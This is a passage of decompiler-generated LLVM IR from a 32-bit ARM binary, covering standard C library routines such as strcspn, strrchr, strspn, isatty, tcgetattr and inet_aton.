  br i1 %v9_179c0, label %dec_label_pc_17a8c, label %dec_label_pc_179c8

dec_label_pc_179c8:                               ; preds = %dec_label_pc_179bc
  %v2_179c8 = icmp eq i8 %v2_179bc, 0
  br i1 %v2_179c8, label %dec_label_pc_17a8c, label %dec_label_pc_179d0

dec_label_pc_179d0:                               ; preds = %dec_label_pc_179c8
  %v1_179d0 = add i32 %v0_179d0, 1
  %v1_179d4 = urem i32 %v1_179d0, 4
  %v2_179d4 = icmp eq i32 %v1_179d4, 0
  br i1 %v2_179d4, label %dec_label_pc_179dc, label %dec_label_pc_179bc

dec_label_pc_179dc:                               ; preds = %dec_label_pc_179d0, %entry
  %v0_179e0 = phi i32 [ %v0_179d42, %entry ], [ %v1_179d0, %dec_label_pc_179d0 ]
  %v4_179dc = mul nuw nsw i32 %v1_179b4, 256
  %v5_179dc = or i32 %v4_179dc, %v1_179b4
  %v4_179e4 = mul i32 %v5_179dc, 65536
  %v5_179e4 = or i32 %v4_179e4, %v5_179dc
  br label %dec_label_pc_179e8

dec_label_pc_179e8:                               ; preds = %dec_label_pc_17a84, %dec_label_pc_17a24, %dec_label_pc_179dc
  %v0_17a4c = phi i32 [ %v0_179e0, %dec_label_pc_179dc ], [ %v4_179e8, %dec_label_pc_17a24 ], [ %v4_179e8, %dec_label_pc_17a84 ]
  %v1_179e8 = inttoptr i32 %v0_17a4c to i32*
  %v2_179e8 = load i32, i32* %v1_179e8, align 4
  %v4_179e8 = add i32 %v0_17a4c, 4
  %v2_179f0 = xor i32 %v2_179e8, %v5_179e4
  %v2_179fc = add i32 %v2_179e8, 2130640639
  %v1_17a00 = sub i32 -1, %v2_179e8
  %v2_17a04 = xor i32 %v2_179fc, %v1_17a00
  %v2_17a10 = and i32 %v2_17a04, -2130640640
  store i32 %v2_17a10, i32* @r1, align 4
  %v2_17a18 = icmp eq i32 %v2_17a10, 0
  br i1 %v2_17a18, label %dec_label_pc_17a24, label %dec_label_pc_17a2c

dec_label_pc_17a24:                               ; preds = %dec_label_pc_179e8
  %v2_179f4 = add i32 %v2_179f0, 2130640639
  %v1_17a0c = sub i32 -1, %v2_179f0
  %v2_17a14 = xor i32 %v2_179f4, %v1_17a0c
  %v2_17a1c = and i32 %v2_17a14, -2130640640
  %v2_17a24 = icmp eq i32 %v2_17a1c, 0
  br i1 %v2_17a24, label %dec_label_pc_179e8, label %dec_label_pc_17a2c

dec_label_pc_17a2c:                               ; preds = %dec_label_pc_179e8, %dec_label_pc_17a24
  %v2_17a2c = inttoptr i32 %v0_17a4c to i8*
  %v3_17a2c = load i8, i8* %v2_17a2c, align 1
  %v4_17a2c = zext i8 %v3_17a2c to i32
  %v9_17a30 = icmp eq i32 %v4_17a2c, %v1_179b4
  br i1 %v9_17a30, label %dec_label_pc_17a8c, label %dec_label_pc_17a3c

dec_label_pc_17a3c:                               ; preds = %dec_label_pc_17a2c
  %v2_17a3c = icmp eq i8 %v3_17a2c, 0
  br i1 %v2_17a3c, label %dec_label_pc_17a8c, label %dec_label_pc_17a44

dec_label_pc_17a44:                               ; preds = %dec_label_pc_17a3c
  %v1_17a44 = add i32 %v0_17a4c, 1
  %v2_17a44 = inttoptr i32 %v1_17a44 to i8*
  %v3_17a44 = load i8, i8* %v2_17a44, align 1
  %v4_17a44 = zext i8 %v3_17a44 to i32
  %v9_17a48 = icmp eq i32 %v4_17a44, %v1_179b4
  br i1 %v9_17a48, label %dec_label_pc_17a8c, label %dec_label_pc_17a54

dec_label_pc_17a54:                               ; preds = %dec_label_pc_17a44
  %v2_17a54 = icmp eq i8 %v3_17a44, 0
  br i1 %v2_17a54, label %dec_label_pc_17a8c, label %dec_label_pc_17a5c

dec_label_pc_17a5c:                               ; preds = %dec_label_pc_17a54
  %v1_17a5c = add i32 %v0_17a4c, 2
  %v2_17a5c = inttoptr i32 %v1_17a5c to i8*
  %v3_17a5c = load i8, i8* %v2_17a5c, align 1
  %v4_17a5c = zext i8 %v3_17a5c to i32
  %v9_17a60 = icmp eq i32 %v4_17a5c, %v1_179b4
  br i1 %v9_17a60, label %dec_label_pc_17a8c, label %dec_label_pc_17a6c

dec_label_pc_17a6c:                               ; preds = %dec_label_pc_17a5c
  %v2_17a6c = icmp eq i8 %v3_17a5c, 0
  br i1 %v2_17a6c, label %dec_label_pc_17a8c, label %dec_label_pc_17a74

dec_label_pc_17a74:                               ; preds = %dec_label_pc_17a6c
  %v1_17a74 = add i32 %v0_17a4c, 3
  %v2_17a74 = inttoptr i32 %v1_17a74 to i8*
  %v3_17a74 = load i8, i8* %v2_17a74, align 1
  %v4_17a74 = zext i8 %v3_17a74 to i32
  %v9_17a78 = icmp eq i32 %v4_17a74, %v1_179b4
  br i1 %v9_17a78, label %dec_label_pc_17a8c, label %dec_label_pc_17a84

dec_label_pc_17a84:                               ; preds = %dec_label_pc_17a74
  %v2_17a84 = icmp eq i8 %v3_17a74, 0
  br i1 %v2_17a84, label %dec_label_pc_17a8c, label %dec_label_pc_179e8

dec_label_pc_17a8c:                               ; preds = %dec_label_pc_179c8, %dec_label_pc_179bc, %dec_label_pc_17a84, %dec_label_pc_17a74, %dec_label_pc_17a6c, %dec_label_pc_17a5c, %dec_label_pc_17a54, %dec_label_pc_17a44, %dec_label_pc_17a3c, %dec_label_pc_17a2c
  %v1_17a90 = phi i32 [ %v1_17a74, %dec_label_pc_17a84 ], [ %v1_17a74, %dec_label_pc_17a74 ], [ %v1_17a5c, %dec_label_pc_17a6c ], [ %v1_17a5c, %dec_label_pc_17a5c ], [ %v1_17a44, %dec_label_pc_17a54 ], [ %v1_17a44, %dec_label_pc_17a44 ], [ %v0_17a4c, %dec_label_pc_17a3c ], [ %v0_17a4c, %dec_label_pc_17a2c ], [ %v0_179d0, %dec_label_pc_179bc ], [ %v0_179d0, %dec_label_pc_179c8 ]
  ret i32 %v1_17a90

; uselistorder directives
  uselistorder i32 %v4_179e8, { 1, 0 }
  uselistorder i32 %v2_179e8, { 0, 2, 1 }
  uselistorder i32 %v0_17a4c, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_179dc, { 1, 0 }
  uselistorder i32 %v1_179d0, { 1, 0, 2 }
  uselistorder i32 %v0_179d42, { 2, 1, 0 }
  uselistorder i32 %v1_179b4, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 2130640639, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_17a8c, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_17a2c, { 1, 0 }
  uselistorder label %dec_label_pc_179bc, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_17a9c = load i32, i32* @r4, align 4
  store i32 %v3_17a9c, i32* %stack_var_-16, align 4
  %v6_17a9c = load i32, i32* @r5, align 4
  %v9_17a9c = load i32, i32* @r6, align 4
  %v0_17aa0 = load i32, i32* @r0, align 4
  %v0_17aa4 = load i32, i32* @r1, align 4
  store i32 %v0_17aa4, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_17ac08 = inttoptr i32 %v0_17aa0 to i8*
  %v2_17ac09 = load i8, i8* %v1_17ac08, align 1
  %v3_17ac010 = zext i8 %v2_17ac09 to i32
  store i32 %v3_17ac010, i32* @r1, align 4
  %v2_17ac411 = icmp eq i8 %v2_17ac09, 0
  store i32 %v0_17aa4, i32* @r0, align 4
  %v1_17acc12 = add i32 %v0_17aa0, 1
  store i32 %v1_17acc12, i32* @r4, align 4
  br i1 %v2_17ac411, label %dec_label_pc_17ad4, label %dec_label_pc_17ab0

dec_label_pc_17ab0:                               ; preds = %entry, %dec_label_pc_17abc
  %v3_17ac014 = phi i32 [ %v3_17ac0, %dec_label_pc_17abc ], [ %v3_17ac010, %entry ]
  %v0_17ac813 = phi i32 [ %v0_17ac8.pre, %dec_label_pc_17abc ], [ %v0_17aa4, %entry ]
  %v2_17ab0 = call i32 @__GI_strchr(i32 %v0_17ac813, i32 %v3_17ac014)
  %v2_17ab4 = icmp eq i32 %v2_17ab0, 0
  %v0_17abc = load i32, i32* @r5, align 4
  br i1 %v2_17ab4, label %dec_label_pc_17abc, label %dec_label_pc_17ad4

dec_label_pc_17abc:                               ; preds = %dec_label_pc_17ab0
  %v1_17abc = add i32 %v0_17abc, 1
  %v0_17ac0.pre = load i32, i32* @r4, align 4
  %v0_17ac8.pre = load i32, i32* @r6, align 4
  store i32 %v1_17abc, i32* @r5, align 4
  %v1_17ac0 = inttoptr i32 %v0_17ac0.pre to i8*
  %v2_17ac0 = load i8, i8* %v1_17ac0, align 1
  %v3_17ac0 = zext i8 %v2_17ac0 to i32
  store i32 %v3_17ac0, i32* @r1, align 4
  %v2_17ac4 = icmp eq i8 %v2_17ac0, 0
  store i32 %v0_17ac8.pre, i32* @r0, align 4
  %v1_17acc = add i32 %v0_17ac0.pre, 1
  store i32 %v1_17acc, i32* @r4, align 4
  br i1 %v2_17ac4, label %dec_label_pc_17ad4, label %dec_label_pc_17ab0

dec_label_pc_17ad4:                               ; preds = %dec_label_pc_17abc, %dec_label_pc_17ab0, %entry
  %v0_17ad4 = phi i32 [ 0, %entry ], [ %v0_17abc, %dec_label_pc_17ab0 ], [ %v1_17abc, %dec_label_pc_17abc ]
  %v2_17ad8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17ad8, i32* @r4, align 4
  store i32 %v6_17a9c, i32* @r5, align 4
  store i32 %v9_17a9c, i32* @r6, align 4
  ret i32 %v0_17ad4

; uselistorder directives
  uselistorder i32 %v3_17ac0, { 1, 0 }
  uselistorder i32 %v0_17ac8.pre, { 1, 0 }
  uselistorder i32 %v0_17ac0.pre, { 1, 0 }
  uselistorder label %dec_label_pc_17ab0, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_17ae4 = urem i32 %arg2, 256
  store i32 %v1_17ae4, i32* @r4, align 4
  %v2_17ae4 = icmp eq i32 %v1_17ae4, 0
  br i1 %v2_17ae4, label %dec_label_pc_17af8, label %dec_label_pc_17b0c.preheader

dec_label_pc_17b0c.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_17b143 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_17ae4)
  %v2_17b185 = icmp eq i32 %v2_17b143, 0
  br i1 %v2_17b185, label %dec_label_pc_17b20, label %dec_label_pc_17b04

dec_label_pc_17af8:                               ; preds = %entry
  %v2_17afc = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_17b24

dec_label_pc_17b04:                               ; preds = %dec_label_pc_17b0c.preheader, %dec_label_pc_17b04
  %v2_17b146 = phi i32 [ %v2_17b14, %dec_label_pc_17b04 ], [ %v2_17b143, %dec_label_pc_17b0c.preheader ]
  store i32 %v2_17b146, i32* @r5, align 4
  %v1_17b08 = add i32 %v2_17b146, 1
  store i32 %v1_17b08, i32* @r0, align 4
  %v0_17b10 = load i32, i32* @r4, align 4
  %v2_17b14 = call i32 @__GI_strchr(i32 %v1_17b08, i32 %v0_17b10)
  %v2_17b18 = icmp eq i32 %v2_17b14, 0
  br i1 %v2_17b18, label %dec_label_pc_17b20, label %dec_label_pc_17b04

dec_label_pc_17b20:                               ; preds = %dec_label_pc_17b04, %dec_label_pc_17b0c.preheader
  %v0_17b20 = load i32, i32* @r5, align 4
  br label %dec_label_pc_17b24

dec_label_pc_17b24:                               ; preds = %dec_label_pc_17af8, %dec_label_pc_17b20
  %storemerge = phi i32 [ %v2_17afc, %dec_label_pc_17af8 ], [ %v0_17b20, %dec_label_pc_17b20 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_17b14, { 1, 0 }
  uselistorder i32 %v1_17b08, { 1, 0 }
  uselistorder i32 %v1_17ae4, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_17b24, { 1, 0 }
  uselistorder label %dec_label_pc_17b04, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v0_17b602 = load i32, i32* @r0, align 4
  %v1_17b603 = inttoptr i32 %v0_17b602 to i8*
  %v2_17b604 = load i8, i8* %v1_17b603, align 1
  %v2_17b646 = icmp eq i8 %v2_17b604, 0
  br i1 %v2_17b646, label %dec_label_pc_17b70, label %dec_label_pc_17b44.preheader

dec_label_pc_17b3c:                               ; preds = %dec_label_pc_17b44
  %v1_17b4c = add i32 %v0_17b4c, 1
  %v9_17b3c = icmp eq i8 %v0_17b3c10.in, %v2_17b44
  br i1 %v9_17b3c, label %dec_label_pc_17b58, label %dec_label_pc_17b44

dec_label_pc_17b44:                               ; preds = %dec_label_pc_17b44.preheader, %dec_label_pc_17b3c
  %v0_17b4c = phi i32 [ %tmp, %dec_label_pc_17b44.preheader ], [ %v1_17b4c, %dec_label_pc_17b3c ]
  %v1_17b44 = inttoptr i32 %v0_17b4c to i8*
  %v2_17b44 = load i8, i8* %v1_17b44, align 1
  %v2_17b48 = icmp eq i8 %v2_17b44, 0
  br i1 %v2_17b48, label %dec_label_pc_17b70, label %dec_label_pc_17b3c

dec_label_pc_17b58:                               ; preds = %dec_label_pc_17b3c
  %v1_17b58 = add i32 %v0_17b58, 1
  %v1_17b5c = add i32 %v0_17b5c, 1
  %v1_17b60 = inttoptr i32 %v1_17b5c to i8*
  %v2_17b60 = load i8, i8* %v1_17b60, align 1
  %v2_17b64 = icmp eq i8 %v2_17b60, 0
  br i1 %v2_17b64, label %dec_label_pc_17b70, label %dec_label_pc_17b44.preheader

dec_label_pc_17b44.preheader:                     ; preds = %entry, %dec_label_pc_17b58
  %v0_17b5c = phi i32 [ %v1_17b5c, %dec_label_pc_17b58 ], [ %v0_17b602, %entry ]
  %v0_17b58 = phi i32 [ %v1_17b58, %dec_label_pc_17b58 ], [ 0, %entry ]
  %v0_17b3c10.in = phi i8 [ %v2_17b60, %dec_label_pc_17b58 ], [ %v2_17b604, %entry ]
  br label %dec_label_pc_17b44

dec_label_pc_17b70:                               ; preds = %dec_label_pc_17b58, %dec_label_pc_17b44, %entry
  %v0_17b70 = phi i32 [ 0, %entry ], [ %v0_17b58, %dec_label_pc_17b44 ], [ %v1_17b58, %dec_label_pc_17b58 ]
  ret i32 %v0_17b70

; uselistorder directives
  uselistorder i8 %v2_17b44, { 1, 0 }
  uselistorder i32 %v0_17b4c, { 1, 0 }
  uselistorder label %dec_label_pc_17b44.preheader, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_17b84 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_17b84, i32* @r1, align 4
  %v0_17b88 = call i32 @__GI_tcgetattr()
  %v1_17b8c = sub i32 1, %v0_17b88
  %v2_17b8c = icmp ult i32 %v0_17b88, 2
  br i1 %v2_17b8c, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_17b9c = phi i32 [ %v1_17b8c, %entry ], [ 0, %bb ]
  ret i32 %v1_17b9c

; uselistorder directives
  uselistorder i32 %v0_17b88, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_17ba0 = load i32, i32* @r4, align 4
  %v6_17ba0 = load i32, i32* @r5, align 4
  %v9_17ba0 = load i32, i32* @r6, align 4
  %v2_17ba8 = ptrtoint i32* %stack_var_-52 to i32
  %v0_17bac = load i32, i32* @r1, align 4
  store i32 %v0_17bac, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_17bb8 = load i32, i32* @r0, align 4
  %v3_17bb8 = call i32 @ioctl(i32 %v0_17bb8, i32 21505, i32 %v2_17ba8)
  store i32 %v3_17bb8, i32* %r0.global-to-local, align 4
  store i32 %v3_17bb8, i32* @r5, align 4
  %v2_17bbc = icmp eq i32 %v3_17bb8, 0
  br i1 %v2_17bbc, label %dec_label_pc_17bc4, label %dec_label_pc_17c08

dec_label_pc_17bc4:                               ; preds = %entry
  %v4_17bd0 = zext i8 %tmp to i32
  store i32 %v4_17bd0, i32* @ip, align 4
  %v3_17bd4 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_17bd4, i32* @r3, align 4
  %v1_17bd8 = load i32, i32* @r4, align 4
  %v2_17bd8 = add i32 %v1_17bd8, 4
  %v3_17bd8 = inttoptr i32 %v2_17bd8 to i32*
  %v0_17bdc = load i32, i32* %r1.global-to-local, align 4
  %v1_17bdc = load i32, i32* @r4, align 4
  %v2_17bdc = add i32 %v1_17bdc, 8
  %v3_17bdc = inttoptr i32 %v2_17bdc to i32*
  store i32 %v0_17bdc, i32* %v3_17bdc, align 4
  %v0_17be0 = load i32, i32* %r0.global-to-local, align 4
  %v1_17be0 = load i32, i32* @r4, align 4
  %v2_17be0 = add i32 %v1_17be0, 12
  %v3_17be0 = inttoptr i32 %v2_17be0 to i32*
  store i32 %v0_17be0, i32* %v3_17be0, align 4
  %v2_17be4 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_17be4, i32* @r1, align 4
  %v1_17bec = load i32, i32* @r4, align 4
  %v2_17bec = inttoptr i32 %v1_17bec to i32*
  store i32 %v3_17bd4, i32* %v2_17bec, align 4
  %v0_17bf0 = load i32, i32* @ip, align 4
  %v1_17bf0 = trunc i32 %v0_17bf0 to i8
  %v2_17bf0 = load i32, i32* @r4, align 4
  %v3_17bf0 = add i32 %v2_17bf0, 16
  %v4_17bf0 = inttoptr i32 %v3_17bf0 to i8*
  store i8 %v1_17bf0, i8* %v4_17bf0, align 1
  %v0_17bf4 = load i32, i32* @r4, align 4
  %v1_17bf4 = add i32 %v0_17bf4, 17
  store i32 %v1_17bf4, i32* %r0.global-to-local, align 4
  %v4_17bf8 = call i32 @__GI_mempcpy(i32 %v1_17bf4, i32 %v2_17be4, i32 19, i32 %v3_17bd4)
  store i32 %v4_17bf8, i32* %r0.global-to-local, align 4
  %v0_17bfc = load i32, i32* @r5, align 4
  store i32 %v0_17bfc, i32* %r1.global-to-local, align 4
  %v3_17c04 = inttoptr i32 %v4_17bf8 to i8*
  %v4_17c04 = call i32 @__GI_memset(i8* %v3_17c04, i32 %v0_17bfc, i32 13)
  store i32 %v4_17c04, i32* %r0.global-to-local, align 4
  %v0_17c08.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17c08

dec_label_pc_17c08:                               ; preds = %entry, %dec_label_pc_17bc4
  %v0_17c08 = phi i32 [ %v3_17bb8, %entry ], [ %v0_17c08.pre, %dec_label_pc_17bc4 ]
  store i32 %v0_17c08, i32* %r0.global-to-local, align 4
  store i32 %v3_17ba0, i32* @r4, align 4
  store i32 %v6_17ba0, i32* @r5, align 4
  store i32 %v9_17ba0, i32* @r6, align 4
  ret i32 %v0_17c08

; uselistorder directives
  uselistorder i32 %v0_17c08, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 17, { 16, 1, 4, 19, 20, 5, 21, 17, 18, 6, 7, 8, 9, 10, 11, 22, 12, 23, 13, 24, 25, 14, 26, 15, 2, 27, 3, 28, 29, 30, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17c08, { 1, 0 }
}

define i32 @inet_aton() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_17c1c = load i32, i32* @r4, align 4
  store i32 %v3_17c1c, i32* %stack_var_-28, align 4
  %v0_17c24 = load i32, i32* @r0, align 4
  %v2_17c24 = icmp eq i32 %v0_17c24, 0
  %v0_17c2c = load i32, i32* @r1, align 4
  br i1 %v2_17c24, label %dec_label_pc_17d00, label %dec_label_pc_17c34

dec_label_pc_17c34:                               ; preds = %entry
  br label %dec_label_pc_17c4c

dec_label_pc_17c4c:                               ; preds = %dec_label_pc_17c34, %dec_label_pc_17cc4
  %v1_17cc4 = phi i32 [ 0, %dec_label_pc_17c34 ], [ %v5_17cc4, %dec_label_pc_17cc4 ]
  %v0_17cc8 = phi i32 [ 1, %dec_label_pc_17c34 ], [ %v1_17cc8, %dec_label_pc_17cc4 ]
  %v0_17c4c = phi i32 [ %v0_17c24, %dec_label_pc_17c34 ], [ %v0_17c4c13, %dec_label_pc_17cc4 ]
  %v1_17c4c = inttoptr i32 %v0_17c4c to i8*
  %v2_17c4c = load i8, i8* %v1_17c4c, align 1
  %v3_17c4c = zext i8 %v2_17c4c to i32
  %v4_17c50 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 276) to i32*), align 4
  %v2_17c54 = mul nuw nsw i32 %v3_17c4c, 2
  %v2_17c58 = add i32 %v2_17c54, %v4_17c50
  %v3_17c58 = inttoptr i32 %v2_17c58 to i16*
  %v4_17c58 = load i16, i16* %v3_17c58, align 2
  %v1_17c5c = and i16 %v4_17c58, 8
  %v2_17c5c = icmp eq i16 %v1_17c5c, 0
  br i1 %v2_17c5c, label %dec_label_pc_17d00, label %dec_label_pc_17c64

dec_label_pc_17c64:                               ; preds = %dec_label_pc_17c4c
  br label %dec_label_pc_17c84

dec_label_pc_17c6c:                               ; preds = %dec_label_pc_17c84
  %v2_17c6c = mul i32 %v0_17cc4, 10
  %v1_17c70 = add i32 %v2_17c6c, -48
  %v2_17c74 = add i32 %v3_17c84, %v1_17c70
  %v8_17c7c = icmp sgt i32 %v2_17c74, 255
  br i1 %v8_17c7c, label %dec_label_pc_17d00, label %dec_label_pc_17c80

dec_label_pc_17c80:                               ; preds = %dec_label_pc_17c6c
  %v1_17c80 = add i32 %v0_17cb4, 1
  store i32 %v1_17c80, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17c84

dec_label_pc_17c84:                               ; preds = %dec_label_pc_17c64, %dec_label_pc_17c80
  %v0_17cc4 = phi i32 [ 0, %dec_label_pc_17c64 ], [ %v2_17c74, %dec_label_pc_17c80 ]
  %v0_17cb4 = phi i32 [ %v0_17c4c, %dec_label_pc_17c64 ], [ %v1_17c80, %dec_label_pc_17c80 ]
  %v1_17c84 = inttoptr i32 %v0_17cb4 to i8*
  %v2_17c84 = load i8, i8* %v1_17c84, align 1
  %v3_17c84 = zext i8 %v2_17c84 to i32
  %v2_17c88 = mul nuw nsw i32 %v3_17c84, 2
  %v2_17c8c = add i32 %v2_17c88, %v4_17c50
  %v3_17c8c = inttoptr i32 %v2_17c8c to i16*
  %v4_17c8c = load i16, i16* %v3_17c8c, align 2
  %v6_17c8c = zext i16 %v4_17c8c to i32
  %v1_17c90 = and i32 %v6_17c8c, 8
  %v2_17c90 = icmp eq i32 %v1_17c90, 0
  br i1 %v2_17c90, label %dec_label_pc_17c98, label %dec_label_pc_17c6c

dec_label_pc_17c98:                               ; preds = %dec_label_pc_17c84
  %v7_17c98 = icmp eq i32 %v0_17cc8, 4
  br i1 %v7_17c98, label %dec_label_pc_17cb0, label %dec_label_pc_17ca0

dec_label_pc_17ca0:                               ; preds = %dec_label_pc_17c98
  %v7_17ca0 = icmp eq i8 %v2_17c84, 46
  br i1 %v7_17ca0, label %dec_label_pc_17ca8, label %dec_label_pc_17d00

dec_label_pc_17ca8:                               ; preds = %dec_label_pc_17ca0
  %v1_17ca8 = add i32 %v0_17cb4, 1
  store i32 %v1_17ca8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17cc4

dec_label_pc_17cb0:                               ; preds = %dec_label_pc_17c98
  %v2_17cb0 = icmp eq i8 %v2_17c84, 0
  %v1_17cb4 = add i32 %v0_17cb4, 1
  store i32 %v1_17cb4, i32* %r0.global-to-local, align 4
  br i1 %v2_17cb0, label %dec_label_pc_17cc4, label %dec_label_pc_17cbc

dec_label_pc_17cbc:                               ; preds = %dec_label_pc_17cb0
  %v1_17cbc = and i32 %v6_17c8c, 32
  %v2_17cbc = icmp eq i32 %v1_17cbc, 0
  br i1 %v2_17cbc, label %dec_label_pc_17d00, label %dec_label_pc_17cc4

dec_label_pc_17cc4:                               ; preds = %dec_label_pc_17cbc, %dec_label_pc_17cb0, %dec_label_pc_17ca8
  %v0_17c4c13 = phi i32 [ %v1_17cb4, %dec_label_pc_17cbc ], [ %v1_17cb4, %dec_label_pc_17cb0 ], [ %v1_17ca8, %dec_label_pc_17ca8 ]
  %v4_17cc4 = mul i32 %v1_17cc4, 256
  %v5_17cc4 = or i32 %v0_17cc4, %v4_17cc4
  %v1_17cc8 = add nuw nsw i32 %v0_17cc8, 1
  %v7_17cd0 = icmp slt i32 %v1_17cc8, 5
  br i1 %v7_17cd0, label %dec_label_pc_17c4c, label %dec_label_pc_17cd4

dec_label_pc_17cd4:                               ; preds = %dec_label_pc_17cc4
  %v2_17cd4 = icmp eq i32 %v0_17c2c, 0
  br i1 %v2_17cd4, label %.thread8.thread, label %bb

.thread8.thread:                                  ; preds = %dec_label_pc_17cd4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17d04

bb:                                               ; preds = %dec_label_pc_17cd4
  %v4_17cd8 = udiv i32 %v5_17cc4, 16777216
  %v2_17cdc = udiv i32 %v5_17cc4, 256
  %v5_17ce0 = and i32 %v2_17cdc, 65280
  %v2_17ce4 = and i32 %v5_17cc4, 65280
  %v5_17ce8 = mul nuw nsw i32 %v2_17ce4, 256
  %v5_17cec = mul i32 %v0_17cc4, 16777216
  %v6_17ce0 = or i32 %v4_17cd8, %v5_17cec
  %v6_17ce8 = or i32 %v6_17ce0, %v5_17ce0
  %v6_17cec = or i32 %v6_17ce8, %v5_17ce8
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_17cf8 = inttoptr i32 %v0_17c2c to i32*
  store i32 %v6_17cec, i32* %v3_17cf8, align 4
  %v2_17d04.pre = load i32, i32* %stack_var_-28, align 4
  %v1_17d08.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17d04

dec_label_pc_17d00:                               ; preds = %dec_label_pc_17ca0, %dec_label_pc_17cbc, %dec_label_pc_17c4c, %dec_label_pc_17c6c, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17d04

dec_label_pc_17d04:                               ; preds = %.thread8.thread, %bb, %dec_label_pc_17d00
  %v1_17d08 = phi i32 [ %v1_17d08.pre, %bb ], [ 0, %dec_label_pc_17d00 ], [ 1, %.thread8.thread ]
  %v2_17d04 = phi i32 [ %v2_17d04.pre, %bb ], [ %v3_17c1c, %dec_label_pc_17d00 ], [ %v3_17c1c, %.thread8.thread ]
  store i32 %v2_17d04, i32* @r4, align 4
  ret i32 %v1_17d08

; uselistorder directives
  uselistorder i32 %v1_17cc8, { 1, 0 }
  uselistorder i32 %v5_17cc4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_17cb4, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 1, 2, 4, 5, 6 }
  uselistorder i32 65280, { 72, 1, 51, 2, 8, 3, 0, 4, 9, 10, 11, 12, 13, 52, 53, 14, 15, 16, 54, 55, 17, 18, 19, 20, 21, 56, 5, 57, 58, 22, 23, 6, 24, 59, 60, 42, 25, 26, 27, 28, 29, 45, 46, 43, 44, 61, 62, 63, 49, 50, 47, 48, 64, 65, 66, 67, 7, 68, 30, 31, 69, 32, 33, 34, 35, 70, 36, 37, 71, 38, 39, 40, 41, 73 }
  uselistorder i8 46, { 0, 1, 3, 2 }
  uselistorder i32 255, { 5, 6, 0, 1, 2, 9, 11, 10, 7, 12, 8, 13, 3, 4 }
  uselistorder i16 0, { 0, 1, 2, 7, 8, 3, 4, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 5, 20, 6, 21, 22, 23 }
  uselistorder i32 276, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17d04, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17d00, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_17c84, { 1, 0 }
  uselistorder label %dec_label_pc_17c4c, { 1, 0 }
}

define i32 @init_static_tls() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v3_17d20 = load i32, i32* @r4, align 4
  store i32 %v3_17d20, i32* %stack_var_-16, align 4
  %v4_17d24 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 72) to i32*), align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v4_17d2c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 60) to i32*), align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_17d34 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 36) to i32*), align 4
  store i32 %v4_17d34, i32* %r4.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v1_17d3c = inttoptr i32 %v4_17d24 to i32*
